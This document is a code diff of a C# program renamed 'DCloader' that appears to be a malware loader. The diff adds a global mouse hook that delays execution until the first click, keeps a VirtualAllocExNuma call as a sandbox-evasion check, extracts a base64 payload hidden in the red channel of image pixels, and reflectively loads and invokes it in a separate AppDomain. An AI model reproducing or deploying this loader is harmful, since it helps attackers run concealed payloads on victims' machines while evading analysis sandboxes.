@@ -3,19 +3,64 @@ using System.Drawing;
 using System.Net;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Windows.Forms;
+using Gma.System.MouseKeyHook;
 
-namespace imgc
+namespace DCloader
 {
     class Program
     {
-        [DllImport("kernel32.dll")]
-        private static extern int VirtualAllocExNuma(IntPtr hProcess, int lpAddress, int dwSize, int flAllocationType, int flProtect, int nndPreferred);
+        
 
         static void Main(string[] args)
         {
-           
-            object mem = null;
-            mem = VirtualAllocExNuma(System.Diagnostics.Process.GetCurrentProcess().Handle, 0, 1000, 0x00002000 | 0x00001000, 0x40, 0);
+            ListenForMouseEvents();
+            //Run the app as a windows forms application
+            Application.Run(new ApplicationContext());
+
+            
+        }
+
+        [DllImport("kernel32.dll")]
+        private static extern int VirtualAllocExNuma(IntPtr hProcess, int lpAddress, int dwSize, int flAllocationType, int flProtect, int nndPreferred);
+
+        
+        public static void ListenForMouseEvents()
+        {
+            int firstTime = 0;
+            //When a mouse button is pressed 
+            Hook.GlobalEvents().MouseDown += async (sender, e) =>
+            {
+                if (firstTime == 0)
+                {
+
+                    firstTime++;
+                    AppDomain tempDomain = AppDomain.CreateDomain("TempDomain");
+                    tempDomain.DoCallBack(Load);
+                    Hook.GlobalEvents().Dispose();
+                }
+
+            };
+        }
+        public static byte[] depixelate(Bitmap img)
+        {
+            StringBuilder holder = new StringBuilder();
+            int xmax = img.Width - 1;
+            int ymax = img.Height - 1;
+            for (int y = 1; y <= ymax; y++)
+            {
+                for (int x = 1; x <= xmax; x++)
+                {
+                    Color c = img.GetPixel(x, y);
+                    holder.Append((char)c.R);
+                }
+            }
+
+            return Convert.FromBase64String(holder.ToString().Replac​e(Convert.ToChar(0).ToString(), ""));
+        }
+        private static void Load()
+        {
+            object mem = VirtualAllocExNuma(System.Diagnostics.Process.GetCurrentProcess().Handle, 0, 1000, 0x00002000 | 0x00001000, 0x40, 0);
 
             if (mem != null)
             {
@@ -54,25 +99,7 @@ namespace imgc
 
                 Console.WriteLine("Running...");
                 System.Reflection.Assembly.Load(outputLoader).GetType("Loader.Loader").GetMethod("RunProgram").Invoke(null, new object[] { outputFile });
-                                               
             }
-        }
-
-        public static byte[] depixelate(Bitmap img)
-        {
-            StringBuilder holder = new StringBuilder();
-            int xmax = img.Width - 1;
-            int ymax = img.Height - 1;
-            for (int y = 1; y <= ymax; y++)
-            {
-                for (int x = 1; x <= xmax; x++)
-                {                    
-                    Color c = img.GetPixel(x, y);
-                    holder.Append((char)c.R);
-                }
-            }
-
-            return Convert.FromBase64String(holder.ToString().Replac​e(Convert.ToChar(0).ToString(), ""));
         }
     }
 
